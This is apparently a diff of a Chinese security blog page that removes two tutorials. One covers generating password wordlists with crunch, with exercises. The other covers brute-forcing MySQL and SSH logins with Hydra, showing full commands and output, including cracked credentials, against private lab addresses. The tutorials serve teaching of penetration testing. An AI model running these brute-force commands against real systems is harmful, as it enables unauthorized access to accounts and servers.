-<h2 id="2-2-生成纯数字密码"><a href="#2-2-生成纯数字密码" class="headerlink" title="2.2 生成纯数字密码"></a>2.2 生成纯数字密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成一个最小字符串长度为两位、最大字符串长度为四位的字典。</span></span><br><span class="line">crunch 2 4 &gt; number.txt</span><br><span class="line"></span><br><span class="line">Crunch will now generate the following amount of data: 2357212 bytes</span><br><span class="line">crunch 现在将生成以下数量的数据：2357212 字节</span><br><span class="line">2 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 475228</span><br><span class="line">crunch 现在将生成以下行数：475228</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-生成指定格式密码"><a href="#2-3-生成指定格式密码" class="headerlink" title="2.3 生成指定格式密码"></a>2.3 生成指定格式密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成7位数，以admin开头+2位数字的字典，保存到admin_num.txt中。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t：指定以某种格式开头</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">%%：表示两位数字</span></span><br><span class="line">crunch 7 7 -t admin%% &gt; admin_num.txt</span><br><span class="line">Crunch will now generate the following amount of data: 800 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 100 </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成以1520003开头的手机号</span></span><br><span class="line">crunch 11 11 -t 1520003%%%% &gt; mobile.txt</span><br><span class="line">Crunch will now generate the following amount of data: 120000 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 10000 </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定的数字生成字典</span></span><br><span class="line">crunch 6 6 0123456789 &gt; num.txt                                  </span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000 </span><br><span class="line"></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst numeric &gt; num_repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 7000000 bytes</span><br><span class="line">6 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 1000000</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-4-依据库文件生成密码"><a href="#2-4-依据库文件生成密码" class="headerlink" title="2.4 依据库文件生成密码"></a>2.4 依据库文件生成密码</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-f：指定库文件</span></span><br><span class="line">crunch 6 6 -f /usr/share/crunch/charset.lst hex-lower -o repo.txt</span><br><span class="line">Crunch will now generate the following amount of data: 117440512 bytes</span><br><span class="line">112 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 16777216 </span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">库文件</span></span><br><span class="line">cat /usr/share/crunch/charset.lst                                </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">charset configuration file <span class="keyword">for</span> winrtgen v1.2 by Massimiliano Montoro (mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Massimiliano Montoro 的 winrtgen v1.2 字符集配置文件(mao@oxid.it)</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compatible with rainbowcrack 1.1 and later by Zhu Shuanglei &lt;shuanglei@hotmail.com&gt;</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">兼容 Zhu Shuanglei 的 rainbowcrack 1.1 以及更高版本。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hex-lower                     = [0123456789abcdef]</span><br><span class="line">十六进制小写</span><br><span class="line">hex-upper                     = [0123456789ABCDEF]</span><br><span class="line">十六进制大写</span><br><span class="line"></span><br><span class="line">numeric                       = [0123456789]</span><br><span class="line">数字的</span><br><span class="line">numeric-space                 = [0123456789 ]</span><br><span class="line">带有空格的数字</span><br><span class="line"></span><br><span class="line">symbols14                     = [!@#$%^&amp;*()-_+=]</span><br><span class="line">symbols14-space               = [!@#$%^&amp;*()-_+= ]</span><br><span class="line"></span><br><span class="line">symbols-all                   = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/]</span><br><span class="line">symbols-all-space             = [!@#$%^&amp;*()-_+=~`[]&#123;&#125;|\:;&quot;&#x27;&lt;&gt;,.?/ ]</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-4-指定元素组合生成字典"><a href="#2-4-指定元素组合生成字典" class="headerlink" title="2.4 指定元素组合生成字典"></a>2.4 指定元素组合生成字典</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定生成的字典，由 ghost、99、22 三个元素组成</span></span><br><span class="line">crunch 3 3 -p ghost 99 22 &gt; combination.txt                       </span><br><span class="line">Crunch will now generate approximately the following amount of data: 60 bytes</span><br><span class="line">0 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 6 </span><br></pre></td></tr></table></figure>
-
-<h1 id="四：练习"><a href="#四：练习" class="headerlink" title="四：练习"></a>四：练习</h1><ul>
-<li>以26个字母为元素最小5位，最大6位的组合，重定向保存到exercise1.txt字典文件中。<ul>
-<li>crunch 5 6 &gt; exericise1.txt</li>
-</ul>
-</li>
-<li>以root字符开头，第五位、第六位为特殊符号，七八九位为123结尾的9位数字字典，重定向保存到exercise2.txt字典文件中<ul>
-<li>crunch 9 9 -t root^^123 &gt; exercise3.txt</li>
-</ul>
-</li>
-<li>指定库文件中的 hex-upper 模板生成6位的字典，使用 -o 参数，保存在 exercise4.txt 字典文件中<ul>
-<li>crunch 6 6 -f &#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst  hex-upper -o exercise4.txt</li>
-</ul>
-</li>
-<li>生成 pdd、1611、0101 这个三个字符串的随机字典，重定向保存到 exercise5.txt 字典文件中<ul>
-<li>crunch 3 3 -p pdd 1611 0101 &gt; exercise5.txt</li>
-</ul>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://aiyingke.cn/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/RupertTears.jpg">
-      <meta itemprop="name" content="Rupert-Tears">
-      <meta itemprop="description" content="每个优秀的人，都有一段沉默的时光。那段时光，是付出了很多努力，却得不到结果的日子，我们把它叫做扎根。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="爱影客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/26/Hydra-%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/" class="post-title-link" itemprop="url">Hydra 使用教程</a>
-        </h2>
-
-        <div class="post-meta">
-          
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-26 13:37:27 / 修改时间：16:04:44" itemprop="dateCreated datePublished" datetime="2022-11-26T13:37:27+08:00">2022-11-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="一：简介"><a href="#一：简介" class="headerlink" title="一：简介"></a>一：简介</h1><p>Hydra 是一款非常强大的暴力破解工具，可以利用它对众多协议进行口令、账号、密码的爆破，支持FTP、MySQL、SMTP、TELNET、SSH等众多的协议爆破。</p>
-<p>Hydra 是一个验证性质的工具，主要目的是：展示安全研究人员从远程获取一个系统认证权限。</p>
-<h1 id="二：基础指令"><a href="#二：基础指令" class="headerlink" title="二：基础指令"></a>二：基础指令</h1><h2 id="2-1-概述"><a href="#2-1-概述" class="headerlink" title="2.1 概述"></a>2.1 概述</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">hydra</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line">Hydra v9.3 2022的作者：van Hauser/THC &amp; David Maciejak。请不要在军事或者特情局组织中使用，或者用于非法目的（这是非约束性的，反正这些****无视法律和道德）</span><br><span class="line"></span><br><span class="line">Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line">语法：hydra ...</span><br><span class="line">hydra [ [-l LOGIN|-L FILE] [-p PASS|-P FILE] ]</span><br><span class="line">hydra [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">选项：</span><br><span class="line">  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE</span><br><span class="line">  -l 登录名 或者 -L 文件  登录使用一个登录名，或者从文件中加载多个登录</span><br><span class="line">  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE</span><br><span class="line">  -p 密码 或者 -P 文件	尝试密码登录，或者从文件中加载多个密码</span><br><span class="line">  -C FILE   colon separated &quot;login:pass&quot; format, instead of -L/-P options</span><br><span class="line">  -C 文件		冒号分隔格式 &quot;login:pass&quot;，而不是 -L/-P 选项</span><br><span class="line">  -M FILE   list of servers to attack, one entry per line, &#x27;:&#x27; to specify port</span><br><span class="line">  -M 文件		要攻击的服务器列表，每行一个条目，使用&#x27;:&#x27;去指定端口</span><br><span class="line">  -t TASKS  run TASKS number of connects in parallel per target (default: 16)</span><br><span class="line">  -t 线程数	运行任务在每一个目标的并行连接数（默认值：16）</span><br><span class="line">  -U        service module usage details</span><br><span class="line">  -U		服务模块使用详情</span><br><span class="line">  -m OPT    options specific for a module, see -U output for information</span><br><span class="line">  -m 选项		特定于模块的选项，使用 -U 查看输出详细信息</span><br><span class="line">  -h        more command line options (COMPLETE HELP)</span><br><span class="line">  -h		更多命令行选项（完整帮助）</span><br><span class="line">  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)</span><br><span class="line">  服务器		目标DNS，IP 或者 网关 192.168.0.0/24（此选项或者 -M 选项）</span><br><span class="line">  service   the service to crack (see below for supported protocols)</span><br><span class="line">  服务		要破解的服务（有关支持的协议，请参见下文）</span><br><span class="line">  OPT       some service modules support additional input (-U for module help)</span><br><span class="line">  选项		一些支持附加输入的服务模块（-U 表示模块帮助）</span><br><span class="line"></span><br><span class="line">Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-&#123;head|get|post&#125; http[s]-&#123;get|post&#125;-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-&#123;cram|digest&#125;md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp</span><br><span class="line">支持的服务：...</span><br><span class="line"></span><br><span class="line">Hydra is a tool to guess/crack valid login/password pairs.</span><br><span class="line">Hydra 是一个 猜测/破解 有效 登录/密码对 的工具。</span><br><span class="line">Licensed under AGPL v3.0. The newest version is always available at;</span><br><span class="line">根据AGPL v3.0许可，最新版本可以从以下网址获取：</span><br><span class="line">https://github.com/vanhauser-thc/thc-hydra</span><br><span class="line">Please don&#x27;t use in military or secret service organizations, or for illegal</span><br><span class="line">purposes. (This is a wish and non-binding - most such people do not care about</span><br><span class="line">laws and ethics anyway - and tell themselves they are one of the good ones.)</span><br><span class="line">请不要使用在军事或者密码服务组织中使用，否则为非法目的。（这是一个愿望，没有约束力，大多数这样的人不关心法律和道德，告诉自己他们是好的。）</span><br><span class="line"></span><br><span class="line">Example:  hydra -l user -P passlist.txt ftp://192.168.0.1</span><br><span class="line">示例：hydar ...</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-2-破解MySQL"><a href="#2-2-破解MySQL" class="headerlink" title="2.2 破解MySQL"></a>2.2 破解MySQL</h2><h3 id="（1）指定-IP-端口破解"><a href="#（1）指定-IP-端口破解" class="headerlink" title="（1）指定 IP 端口破解"></a>（1）指定 IP 端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录账户薄 -P 密码薄 mysql://目标IP:mysql端口号</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt mysql://192.168.1.106:3306</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:23:55</span><br><span class="line">Hydra 开始于 2022-11-26 14:23:55</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">信息：将任务数量减少到4（mysql不喜欢多并行连接）</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">数据：每台服务器最多4个任务，总共4个任务，15次登录尝试（l:3/p:5）,每个任务约4次尝试</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">数据：攻击 mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">1个目标中1个成功完成，找到一个有效密码。</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:23:56</span><br><span class="line">Hydra 完成于 2022-11-26 14:23:56</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）默认端口破解"><a href="#（2）默认端口破解" class="headerlink" title="（2）默认端口破解"></a>（2）默认端口破解</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果服务使用的是默认端口，那么指令也可以这样写</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L ./login.txt -P ./passwd.txt 目标IP mysql</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt 192.168.1.106 mysql       </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 14:55:38</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 14:55:38</span><br></pre></td></tr></table></figure>
-
-<h3 id="（3）展示爆破过程"><a href="#（3）展示爆破过程" class="headerlink" title="（3）展示爆破过程"></a>（3）展示爆破过程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">展示爆破过程，添加指令 -V</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -V  mysql://192.168.1.106:3306 </span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 15:00:51</span><br><span class="line">[INFO] Reduced number of tasks to 4 (mysql does not like many parallel connections)</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 15 login tries (l:3/p:5), ~4 tries per task</span><br><span class="line">[DATA] attacking mysql://192.168.1.106:3306/</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;123456&quot; - 1 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;abcdefg&quot; - 2 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;admin&quot; - 3 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;root&quot; - 4 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;ghost&quot; - pass &quot;987654&quot; - 5 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;123456&quot; - 6 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;abcdefg&quot; - 7 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;admin&quot; - 8 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;root&quot; - 9 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;root&quot; - pass &quot;987654&quot; - 10 of 15 [child 1] (0/0)</span><br><span class="line">[3306][mysql] host: 192.168.1.106   login: root   password: root</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;123456&quot; - 11 of 15 [child 3] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;abcdefg&quot; - 12 of 15 [child 0] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;admin&quot; - 13 of 15 [child 1] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;root&quot; - 14 of 15 [child 2] (0/0)</span><br><span class="line">[ATTEMPT] target 192.168.1.106 - login &quot;admin&quot; - pass &quot;987654&quot; - 15 of 15 [child 3] (0/0)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 15:00:51</span><br></pre></td></tr></table></figure>
-
-<h2 id="2-3-ssh-破解"><a href="#2-3-ssh-破解" class="headerlink" title="2.3 ssh 破解"></a>2.3 ssh 破解</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hydra -L 登录薄 -P 密码薄 -t 线程数 ssh://目标ip</span></span><br><span class="line">hydra -L ./login.txt -P ./passwd.txt -t 4 ssh://192.168.80.129</span><br><span class="line"></span><br><span class="line">Hydra v9.3 (c) 2022 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-26 16:02:31</span><br><span class="line">[DATA] max 4 tasks per 1 server, overall 4 tasks, 9 login tries (l:3/p:3), ~3 tries per task</span><br><span class="line">[DATA] attacking ssh://192.168.80.129:22/</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: ghost   password: root</span><br><span class="line">[22][ssh] host: 192.168.80.129   login: root   password: root</span><br><span class="line">1 of 1 target successfully completed, 2 valid passwords found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-26 16:02:50</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1582,7 +1748,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-count">62</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1649,7 +1815,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">本博客全站共40.5k字</span>
+  <span class="post-count">本博客全站共43.6k字</span>
 </div>
 
 
